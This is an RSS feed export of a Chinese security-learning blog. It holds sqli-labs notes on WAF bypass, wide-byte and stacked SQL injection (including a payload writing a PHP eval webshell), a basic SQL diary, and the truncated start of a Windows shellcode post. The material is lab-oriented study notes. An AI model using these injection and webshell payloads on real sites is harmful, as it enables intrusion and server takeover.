一般WAF执行需要优先考虑业务优先原则，对于构造超大的数据包可能不会进行检测，实现绕过；</p></li><li><p>协议层面</p><p>​    get型比post型要小，由于业务需求，只对get检测，可通过在post内构造图片后面跟注入语句的方式进行测试；</p><p>​    参数污染：<code>index?id=1&amp;id=2</code> 可能只对id=1进行检测;</p></li><li><p>规则层面</p><p>​    sql注释符绕过：当不允许使用空格，用/**/来代替空格，或者在注释内添加超长内容；</p><p>​                 使用内联注释（mysql特有） <code>/*!union select */</code> 注释内的代码可执行；</p><p>​                 也可以用括号将关键字分割开；</p><p>​    空白符绕过：   对于空格的填充，url编码；</p><p>​                 mysql空白符：%09; %0A; %0B; %0D; %20; %0C; %A0;</p><p>​                 正则空白符：%09; %0A; %0B; %0D; %20;</p><p>​                 %25编码为%，%25A0则是空白符；</p><p>​    函数分隔符号:  将一个函数进行分割，在函数名称后面跟空白符；</p><p>​    浮点数词法解释：WAF对id=1可以检测，但对于id=1.0、id=\N、id=1E0可能无法检测；</p><p>​    利用error-based进行sql注入；</p><p>​    mysql特殊语法：例如 select {x name} from {x table}；</p><p>​    大小写绕过：   如果对 and or union 关键字过滤，可以采用大小写混用的方法，也可使用双写；</p><p>​                 在过滤大小写混用时，采用OORr的写法，会被过滤为or（中间or消失），则是双写，也可以尝试关键词替换；</p></li></ul></li><li><p>fuzz测试</p><ul><li>使用bp测试，测试成功用脚本处理；</li></ul></li></ul><p>使用报错注入过滤空格可用 ^ 来连接函数，针对and or全面封锁;</p><h2 id="less26-less28a"><a href="#less26-less28a" class="headerlink" title="less26~less28a"></a>less26~less28a</h2><p>本题通关方式与25大差不差，原理也和WAF绕过有关；</p><h3 id="脚本获取空格符替换对应的url编码"><a href="#脚本获取空格符替换对应的url编码" class="headerlink" title="脚本获取空格符替换对应的url编码"></a>脚本获取空格符替换对应的url编码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#循环查找编码</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    code = <span class="built_in">hex</span>(i).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(code) &lt; <span class="number">2</span>):</span><br><span class="line">        code = <span class="string">&#x27;0&#x27;</span> + code</span><br><span class="line">    code = <span class="string">&#x27;%&#x27;</span> + code</span><br><span class="line">    <span class="comment">#构造发送url</span></span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-26/?id=1&#x27;&quot;</span> + code + <span class="string">&quot;%26%26&quot;</span> + code + <span class="string">&quot;&#x27;1&#x27;=1&#x27;&quot;</span></span><br><span class="line">    <span class="comment">#通过回响包中是否返回正确的内容来判断空格正确</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="comment">#解码raw</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;ignore&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure><p>这里需要提一下，windows的apache环境对于空格编码有问题，需要docker环境搭建的sqli靶场才能用上述脚本找出合适的编码，不然统统都不能过；</p><p>当然也可以用报错注入的方式来获取内容，用括号分割关键字，就不需要空格了；</p><p>使用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -dt --name Dsqli -p 80:80 --rm acgpiano/sqli-labs</span><br><span class="line">docker start ID</span><br></pre></td></tr></table></figure><p>用pull建立镜像后，run，之后映射80端口，使用ssh连接时使用的ip和端口访问docker搭建的靶场；</p><p>对于where 后面 加括号包裹，会将结果返回为0或1，导致有时候只用引号就能判断出注入点，实际上是误判了，这样只用引号去闭合会出现中间的内容写了也没有作用，只有加括号闭合的方式，才能使得中间的语句成功执行；</p><h2 id="less29-less31"><a href="#less29-less31" class="headerlink" title="less29~less31"></a>less29~less31</h2><h3 id="服务器两层架构"><a href="#服务器两层架构" class="headerlink" title="服务器两层架构"></a>服务器两层架构</h3><p>客户端首先发送请求给tomcat服务器，之后由此服务器转交给apache，响应后返回给tomcat，由tomcat传递给客户端；</p><p>客户端访问url传递两个相同参数，tomcat接收第一个，apache接收第二个，第一个使用 <code>getParameter</code> 接收纯数字，第二个用php的get变量接收字符串；</p><h2 id="less32-less37"><a href="#less32-less37" class="headerlink" title="less32~less37"></a>less32~less37</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>php和mysql默认编码为GBK，支持两字节编码，函数执行添加的是ASCII编码（单字节）；</p><p>假如使用单引号注入时，mysql对 <code>id=1&#39;</code> 进行了处理使用斜杠转义 <code>id=1\&#39;</code> ,就无法完成注入；</p><p>如果此时在1后面跟 <code>%df</code> 并加上单引号，会让代码部分变成这样的内容： <code>id=1%df\&#39;</code> ;</p><p>而斜杠的url编码是 <code>%5c</code> , 此时代码部分原义为 <code>id=1%df%5c&#39;</code> ，%df%5c 会被编码为GBK中宽字节的内容；</p><p>此时代码部分是这样的： <code>id=1字&#39;</code> ，由于斜杠被编码带入了，单引号得不到转义，可以完成注入；</p><p>第二种方法，将转义单引号的斜杠再转义，构造语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span>aa<span class="operator">%</span><span class="number">5</span>c<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>%5c是斜杠，因为是和单引号一样的敏感内容，所以同样会添加斜杠转义，此时整句处理后的句子如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="operator">%</span>aa<span class="operator">%</span><span class="number">5</span>c <span class="operator">%</span><span class="number">5</span>c<span class="operator">%</span><span class="number">5</span>c <span class="string">&#x27;   --&gt;    id=1字 \\ &#x27;</span></span><br></pre></td></tr></table></figure><p>这样就把转义单引号的斜杠给转义掉了；</p><h3 id="addslashes-mysql-real-escape-string"><a href="#addslashes-mysql-real-escape-string" class="headerlink" title="addslashes() / mysql_real_escape_string()"></a>addslashes() / mysql_real_escape_string()</h3><p>里面添加字符串，在字符串内每个敏感字符前添加反斜杠，也是一种起转义的方法；</p><p>在post注入时， %df 会被url编码为 %25 df 的raw字段，需要将raw的内容改为%df才能绕过转义，当已知转义的情况下，用正常post无法注入，记得抓包查看raw的内容；</p><h2 id="less38-less45"><a href="#less38-less45" class="headerlink" title="less38~less45"></a>less38~less45</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>简单解释，一行两句sql语言，期间用；分号隔开；</p><p>其有局限性，第一，在某些环境下，数据库语言只支持一行一句，第二，web前端查询回显问题，一般只回显第一次查询结果；</p><h3 id="使用堆叠注入写一句话木马"><a href="#使用堆叠注入写一句话木马" class="headerlink" title="使用堆叠注入写一句话木马"></a>使用堆叠注入写一句话木马</h3><p>步骤：</p><ul><li>写权限；</li><li>一句话木马；</li><li>绝对路径;</li><li>select xxx into outfile xxx;</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; select &lt;?php @eval($_POST[pass]); ?&gt; into outfile xxx;</span></span><br></pre></td></tr></table></figure><h2 id="less46-less53"><a href="#less46-less53" class="headerlink" title="less46~less53"></a>less46~less53</h2><h3 id="lines-terminated-by-123"><a href="#lines-terminated-by-123" class="headerlink" title="lines terminated by 123"></a>lines terminated by 123</h3><p>sql关键字，字面意义，在每行后面以 123 进行分割；</p><p>用于插入一句话木马，适用于order by 之后注入的情况，没办法使用堆叠注入的情况；</p><h3 id="mysqli-multi-query"><a href="#mysqli-multi-query" class="headerlink" title="mysqli_multi_query()"></a>mysqli_multi_query()</h3><p>使用这个函数可以一行执行多个SQL语句；</p><p>至此开启挑战篇；</p><p>​                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </p><h2 id="less54-less75"><a href="#less54-less75" class="headerlink" title="less54~less75"></a>less54~less75</h2><p>挑战篇用以上内容都可以解决，就盲注手搓会比较恶心，之后学习sqlmap以及bp的脚本盲注；</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>遇到select完全封锁的情况，且可使用堆叠，可以使用如下语句查看当前数据库下的内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> database;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">show</span> columns <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure><p>之后使用二次注入的思想，利用已有的select查询语法，改变表名，列名，获取数据；</p><p>如下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> n <span class="operator">||</span> id <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p>当n为数字时，一直回显都为1，当n不为数字，不会回显；</p><p>当心注入位置的判断！不一定就在where之后！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本篇根据sqli-labs展开而来笔记，基于mysql，php的环境；&lt;/p&gt;
&lt;p&gt;前置知识：SQL语法，在SQL学习日记中有讲述；&lt;/p&gt;
&lt;h2 id=&quot;less01-less04&quot;&gt;&lt;a href=&quot;#less01-less04&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="Lab" scheme="https://secondbc.github.io/SecondBC/categories/Lab/"/>
    
    
    <category term="Web" scheme="https://secondbc.github.io/SecondBC/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>SQL学习日记</title>
    <link href="https://secondbc.github.io/SecondBC/2024/02/26/SQL%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/"/>
    <id>https://secondbc.github.io/SecondBC/2024/02/26/SQL%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</id>
    <published>2024-02-26T08:39:49.000Z</published>
    <updated>2024-02-26T08:42:01.414Z</updated>
    
    <content type="html"><![CDATA[<p>说实话这篇写的不算什么好玩意儿，没有参考价值，对我有记忆的价值，仅此而已；</p><h2 id="表的增删改查"><a href="#表的增删改查" class="headerlink" title="表的增删改查"></a>表的增删改查</h2><p>假设一张表称为tableA，其结构如下：</p><table><thead><tr><th>id</th><th>name</th><th>major</th></tr></thead><tbody><tr><td>a001</td><td>bear</td><td>a</td></tr><tr><td>a002</td><td>child</td><td>b</td></tr><tr><td>a003</td><td>steve</td><td>c</td></tr></tbody></table><h3 id="SELECT"><a href="#SELECT" class="headerlink" title="SELECT"></a>SELECT</h3><p>查找语句，一般用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> tableA                 #从tableA里查找所有</span><br><span class="line"><span class="keyword">SELECT</span> tableA.id,major <span class="keyword">from</span> tableA   #从tableA里查找除了name的</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> student <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;%e%&#x27;</span> #从tableA里模糊查找带e的内容 <span class="operator">%</span>为任意</span><br></pre></td></tr></table></figure><p>like为模糊查找;</p><h3 id="INSERT"><a href="#INSERT" class="headerlink" title="INSERT"></a>INSERT</h3><p>增添语句，一般用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tableA <span class="keyword">VALUES</span>(<span class="string">&#x27;a004&#x27;</span>,<span class="string">&#x27;crazy&#x27;</span>,<span class="string">&#x27;d&#x27;</span>)   #对tableA插入一行内容</span><br></pre></td></tr></table></figure><h3 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h3><p>改动语句，一般用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE tableA <span class="keyword">set</span> id <span class="operator">=</span> <span class="string">&#x27;a007&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;a001&#x27;</span> #讲a001的id改为a007，<span class="keyword">set</span> <span class="keyword">where</span>不可颠倒</span><br></pre></td></tr></table></figure><p>where即条件查询，后面跟条件，不加where，则全体内容的id都设置为a007，如果id是pk则会失败；</p><p>set是设置，设置一个字段等于一个新值；</p><h3 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h3><p>删除语句，一般用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">from</span> tableA <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;a001&#x27;</span>  #删除id为a001的所有字段</span><br></pre></td></tr></table></figure><h2 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h2><h3 id="单关系"><a href="#单关系" class="headerlink" title="单关系"></a>单关系</h3><h4 id="无条件查询"><a href="#无条件查询" class="headerlink" title="无条件查询"></a>无条件查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> tableA</span><br></pre></td></tr></table></figure><p>只有from的语句；</p><h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> tableA <span class="keyword">where</span> ...</span><br></pre></td></tr></table></figure><p>where后面跟的…即为条件，可以是简单的运算比较符、逻辑运算；</p><ul><li>对于逻辑运算除了用&amp;&amp;，||，！来表示，也可用英文的AND，OR,NOT；</li><li>使用BETWEEN AND可以约束条件范围，用法为： <code>SELECT * from tableA where id BETWEEN 30 AND 40</code> ；</li><li>使用IN可以查询属于集合的元组，用法为： <code>SELECT * from tableA where id IN （&#39;123&#39;，&#39;123&#39;）</code>;</li><li>上面两种查找都可以用运算符来<strong>代替</strong>；</li><li>使用NULL可以查询对应字段为空的空值查询，用法为： <code>SELECT * from tableA where id IS NULL</code>;</li><li>使用LIKE进行模糊查找，用法在上方已给出；</li></ul><h4 id="聚合函数查询"><a href="#聚合函数查询" class="headerlink" title="聚合函数查询"></a>聚合函数查询</h4><p>使用以下函数来操控选择查询的字段值：</p><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>AVG</td><td>字段平均值</td></tr><tr><td>SUM</td><td>字段总和</td></tr><tr><td>MAX</td><td>字段中最大值</td></tr><tr><td>MIN</td><td>同上</td></tr><tr><td>COUNT</td><td>字段值的个数</td></tr></tbody></table><p>使用方法如下： <code>SELECT SUM(score), COUNT(number) from student where ...</code></p><p>上述语句的含义为，查询student表中满足条件的score总和以及number的个数；</p><p>使用<strong>DISTINCT</strong>消除重复元组；</p><h4 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> major, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">from</span> tableA <span class="keyword">GROUP</span> <span class="keyword">BY</span> id <span class="keyword">HAVING</span> ...</span><br></pre></td></tr></table></figure><p>一般用于数字统计的查询，针对于某个字段来分组；</p><p>having类似于group by的where，设置条件，其含义是只显示满足having条件的组；</p><h4 id="查询排序"><a href="#查询排序" class="headerlink" title="查询排序"></a>查询排序</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">from</span> tableA <span class="keyword">order</span> <span class="keyword">by</span> id <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure><p>对于…的查询按照id的降序排序；</p><p>DESC为降序，ASC为升序；</p><h4 id="限制查询"><a href="#限制查询" class="headerlink" title="限制查询"></a>限制查询</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">from</span> tableA LIMIT <span class="number">1</span>,<span class="number">3</span>#从第一行往下<span class="number">1</span>行开始（<span class="number">2</span>行）往后找三行</span><br><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">from</span> tableA LIMIT <span class="number">3</span> <span class="keyword">OFFSET</span> <span class="number">1</span> #和上面等效</span><br></pre></td></tr></table></figure><h3 id="多关系"><a href="#多关系" class="headerlink" title="多关系"></a>多关系</h3><p>内连方法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">from</span> tableA,tableB <span class="keyword">where</span> ...  #等效于下方</span><br><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">from</span> tableA <span class="keyword">inner</span> <span class="keyword">join</span> tableB <span class="keyword">ON</span> ...</span><br></pre></td></tr></table></figure><p>对于内连而言，不满足条件即不显示，外联会跟随某张表（主表）显示这张表满足条件的所有跟随项，不满足条件的内容会以NULL显示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">from</span> tableA <span class="keyword">LEFT</span> <span class="keyword">outer</span> <span class="keyword">join</span> tableB <span class="keyword">on</span> ...</span><br></pre></td></tr></table></figure><p>外连分左右外连，意思是选择左右哪张表作为主表，上述语句tableA在左，所以其为主表；</p><p>关于交叉连接：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> A <span class="keyword">cross</span> <span class="keyword">JOIN</span> B</span><br></pre></td></tr></table></figure><p>字段为A,B一起的总字段，元组则是一个关于A,B元组的笛卡尔积；</p><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><p>创建：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> view_name <span class="keyword">AS</span> ...</span><br></pre></td></tr></table></figure><p>…为完整的select语句构成；</p><p>其意义为，将此select生成的子表封装，称为视图，可直接当作一个表来操作； </p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>创建：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">unique</span> index a <span class="keyword">on</span> tableA(id,name);   #建立id和name的复合唯一索引</span><br><span class="line"><span class="keyword">create</span> index b <span class="keyword">on</span> tableA(name(<span class="number">4</span>),<span class="keyword">DESC</span>);     #建立普通索引对name前<span class="number">4</span>字符以降序排列</span><br><span class="line"><span class="keyword">create</span> fulltext index c <span class="keyword">on</span> tableA(text);    #建立对text的全文索引</span><br></pre></td></tr></table></figure><p>目的是为了加速数据查找的速度；</p><p>对于限定属性的值可以有：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tableA <span class="keyword">add</span>(<span class="keyword">constraint</span> 限定名 <span class="keyword">check</span>(major regexp <span class="string">&#x27;[0-9]&#x27;</span>))  #限定major只能填<span class="number">0</span><span class="number">-9</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> tableA <span class="keyword">add</span>(<span class="keyword">constraint</span> 限定名 <span class="keyword">check</span>(major <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> major <span class="operator">=</span> <span class="string">&#x27;2&#x27;</span>)) #限定只能为<span class="number">1</span>或<span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>创建：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> if <span class="keyword">not</span> <span class="keyword">exists</span> <span class="string">&#x27;Second_BC&#x27;</span> <span class="keyword">BY</span> <span class="string">&#x27;123321&#x27;</span>   #以<span class="number">123321</span>口令建立此用户</span><br></pre></td></tr></table></figure><p>在sql中，权限组叫角色（role）</p><p>权限是针对于用户对对象的命令使用权；</p><h2 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lock <span class="keyword">table</span> xxx read; #读锁<span class="operator">/</span>共享</span><br><span class="line">lock <span class="keyword">table</span> xxx write;#写锁<span class="operator">/</span>最高限定</span><br><span class="line">#解锁</span><br><span class="line">unlock <span class="keyword">table</span> xxx;</span><br></pre></td></tr></table></figure><p>另外还有行级锁：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tableA <span class="keyword">where</span> id <span class="operator">=</span> xxx LOCK <span class="keyword">IN</span> SHARE MODE;   #共享</span><br><span class="line"><span class="keyword">select</span> ... <span class="keyword">FOR</span> UPDATE;      #操作类型指令为写锁</span><br></pre></td></tr></table></figure><p>行级锁限定时总会存在where来指定行；</p><h2 id="对于ALTER操作"><a href="#对于ALTER操作" class="headerlink" title="对于ALTER操作"></a>对于ALTER操作</h2><p>改表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> 表名 <span class="keyword">to</span> 新表名;</span><br></pre></td></tr></table></figure><p>改字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名 change 字段名 新字段名 类型;</span><br></pre></td></tr></table></figure><p>类型可以与之前一样就行；</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;说实话这篇写的不算什么好玩意儿，没有参考价值，对我有记忆的价值，仅此而已；&lt;/p&gt;
&lt;h2 id=&quot;表的增删改查&quot;&gt;&lt;a href=&quot;#表的增删改查&quot; class=&quot;headerlink&quot; title=&quot;表的增删改查&quot;&gt;&lt;/a&gt;表的增删改查&lt;/h2&gt;&lt;p&gt;假设一张表称为ta</summary>
      
    
    
    
    <category term="Diary" scheme="https://secondbc.github.io/SecondBC/categories/Diary/"/>
    
    
    <category term="Web" scheme="https://secondbc.github.io/SecondBC/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Windows_Shellcode</title>
    <link href="https://secondbc.github.io/SecondBC/2023/06/19/Windows_Shellcode/"/>
    <id>https://secondbc.github.io/SecondBC/2023/06/19/Windows_Shellcode/</id>
    <published>2023-06-19T07:30:19.000Z</published>
    <updated>2023-06-19T07:32:57.659Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><p>VS编写壳代码需要用到裸函数，在其中使用内联汇编：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> _declspec(naked)<span class="built_in">funcName</span>()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push <span class="number">0</span>;</span><br><span class="line">        mov eax, <span class="number">0xdeadbeaf</span>;</span><br><span class="line">        call eax;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用函数<strong>不能</strong>直接call一个立即数地址；</p><p>提取机械码用ida；</p><p>尽量不使payload中出现\x00，导致<strong>字符串截断</strong>；</p><p><code>push 0; -&gt;  xor edi, edi; push edi;</code></p><p>在windowsROP里，此电脑 -&gt; 管理 -&gt; 事件查看器 -&gt; Windows日志 -&gt; 应用程序 以查看触发异常；</p><h2 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h2><p>在WindowsAPI中，<code>jmp esp</code> 指令做为一个常见gadget，其地址在同版本API库加载dll时大部分情况下（没开随机地址）固定，32位情况下为 0x7xxxxxxx；</p><p>实现ROP即可使返回地址指向 <code>jmp esp</code> ，使其作为跳板让eip指向返回地址后面的shellcode；</p><h2 id="TEB-PEB查找模块"><a href="#TEB-PEB查找模块" class="headerlink" title="TEB/PEB查找模块"></a>TEB/PEB查找模块</h2><blockquote><p>为了使shellcode通用性强,可用TEB/PEB查找API模块,不使用立即数地址；</p></blockquote><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>所有进程都会引用 kernel32.dll；</p><p>窗口程序（WinMain）user32.dll 专用，封装所有窗口操作相关API；</p><p>无论kernel32或user32最终会调用 <em><strong>ntdll.dll</strong></em>，r0大门；</p><p>TEB：thread environment block</p><p>线程环境块，结构体，保存线程中各种信息，每个线程都有一个；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TEB</span><br><span class="line">&#123;</span><br><span class="line">    +<span class="number">0x00</span> _NT_TIB NtTib; <span class="comment">//线程信息块</span></span><br><span class="line">    +<span class="number">0x30</span> _PEB* PPEB;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 线程信息块：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>_<span class="title">NT_TIB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span>_<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span><span class="comment">//用于操作SEH</span></span><br><span class="line">     <span class="comment">//SEH：windows异常处理机制，大量运用于反调试程序；</span></span><br><span class="line"> PVOID StackBase;</span><br><span class="line"> PVOID StackLimit; </span><br><span class="line"> PVOID SubSystemTib; </span><br><span class="line"> <span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">PVOID FiberData; </span><br><span class="line">DWORD Version;</span><br><span class="line"> &#125;; </span><br><span class="line"> PVOID ArbitraryUserPointer;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span>_<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span><span class="comment">//指向自己的指针</span></span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure><p>PEB: process environment block</p><p>进程环境块，需要的模块放于其中； </p><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>用 NtCurrentTeb(); 可返回TEB类型指针；</p><p>其内部实现只有一句汇编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, dword ptr fs:[0x18];18h偏移是指向自己的指针 *Self</span><br></pre></td></tr></table></figure><p>则fs段寄存器存放的是TEB，偏移30h为PEB指针；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 